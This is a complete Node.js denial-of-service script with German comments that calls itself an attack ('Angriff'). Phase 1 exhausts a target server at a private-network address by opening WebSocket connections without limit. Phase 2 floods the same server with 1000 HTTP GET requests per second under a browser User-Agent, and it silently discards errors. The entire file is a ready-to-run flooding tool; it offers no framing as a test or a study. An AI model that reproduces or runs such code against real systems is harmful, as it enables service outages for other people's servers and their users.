const io = require('socket.io-client');
const http = require('http');

const SERVER_URL = 'http://192.168.1.121:4000';
const REQUESTS_PER_SECOND = 1000;
const MAX_FAILED_ATTEMPTS = 5;

// High-Performance Agent
const httpAgent = new http.Agent({
    keepAlive: true,
    maxSockets: Infinity
});

let activeSockets = [];
let isPhase2 = false;
let failedAttempts = 0;
let requestCount = 0;
let httpInterval;

// Phase 1: WebSocket-Verbindungen
function startWebSocketPhase() {
    console.log('🔌 Phase 1: WebSocket-Verbindungen...');

    const tryConnect = () => {
        if (isPhase2) return;

        const socket = io(SERVER_URL, {
            transports: ['websocket'],
            reconnection: false,
            timeout: 2000
        });

        socket.on('connect', () => {
            activeSockets.push(socket);
            failedAttempts = 0;
            process.stdout.write(`\r✅ Verbunden: ${activeSockets.length}`);
            tryConnect();
        });

        socket.on('connect_error', () => {
            if (++failedAttempts >= MAX_FAILED_ATTEMPTS && !isPhase2) {
                startHttpFlood();
            } else {
                setTimeout(tryConnect, 100);
            }
        });
    };

    // Starte 5 parallele Verbindungsströme
    for (let i = 0; i < 5; i++) tryConnect();
}

// Phase 2: High-Speed HTTP-Flood
function startHttpFlood() {
    isPhase2 = true;
    console.log('\n🔥 Phase 2: HTTP-Flood (1000 reqs/s)...');

    activeSockets.forEach(s => s.disconnect());
    activeSockets = [];

    httpInterval = setInterval(() => {
        // Batch-Requests mit Performance-Optimierungen
        for (let i = 0; i < REQUESTS_PER_SECOND; i++) {
            const req = http.request(SERVER_URL, {
                agent: httpAgent,
                method: 'GET',
                headers: {
                    'Connection': 'keep-alive',
                    'User-Agent': 'Mozilla/5.0'
                }
            });

            req.on('error', () => {});
            req.end();

            if (++requestCount % 1000 === 0) {
                process.stdout.write(`\r📡 Requests: ${requestCount}`);
            }
        }
    }, 1000);
}

// Start
console.log('💀 Angriff gestartet (Strg+C zum Beenden)\n');
startWebSocketPhase();

// Cleanup
process.on('SIGINT', () => {
    console.log('\n🛑 Beende Angriff...');
    activeSockets.forEach(s => s.disconnect());
    if (httpInterval) clearInterval(httpInterval);
    process.exit();
});